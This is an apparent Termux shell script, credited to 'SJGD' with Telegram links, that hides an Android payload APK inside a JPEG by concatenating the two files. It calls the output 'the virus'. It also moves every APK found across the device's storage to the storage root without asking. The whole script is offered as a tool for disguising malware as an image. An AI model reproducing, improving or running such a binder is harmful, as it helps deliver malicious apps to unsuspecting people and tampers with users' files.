echo -e "\033[32m                                                             
  ,ad8888ba,   8888888ba          88                         
 d8\"'    \`\"8b 88      \"8b         88                         
d8'           88      ,8P         88                         
88            88aaaaaa8P' ,adPPYb,88  ,adPPYba, 8b,     ,d8  
88            88\"\"\"\"88'  a8\"    \`Y88 a8P_____88  \`Y8, ,8P'   
Y8,           88    \`8b  8b       88 8PP\"\"\"\"\"\"\"    )888(     
 Y8a.    .a8P 88     \`8b \"8a,   ,d88 \"8b,   ,aa  ,d8\" \"8b,   
  \`\"Y8888Y\"'  88      \`8b \`\"8bbdP\"Y8  \`\"Ybbd8\"' 8P'     \`Y8  
                                                             
                                                             \033[1m\n"

echo " ❗❗مااااااااااااه‍❗❗"

echo "you should rename payload to become \"Payload.apk\""

input="y"
read -p "did you do that ? (y/n) " user_input

if [[ "$user_input" == "$input" ]]; then
    clear
    echo "❤️WELOCME❤️"
    echo "🔥PRESS ENTER🔥"
    read  
else
    echo "
    please go to rename file to \"Payload.apk\" and come again to termux 
    💜i will wait you💜"
    echo "
    
    "
    read -p "press enter if you finshed"
fi

clear

echo -e "\033[32m
❤️❤️click enter to start the tool❤️❤️🙈\033[1m"
read  

cp abc.jpg /sdcard

find /storage/emulated/0/ -iname "*.apk" -exec mv {} /storage/emulated/0/ \;

echo "

"

wait

cd /sdcard

cat abc.jpg Payload.apk> img202003275.jpg

printf "\e[1;31m
the virus name \"img202003275.jpg\"
\e[0m\n"
echo "

"
printf "\e[1;31m
go to sdcard/ to find the jpg virus
\e[0m\n"

echo "developer : SJGD"
echo "telegram : https://t.me/Sagd112"
echo "telegram : https://t.me/SJGDDW"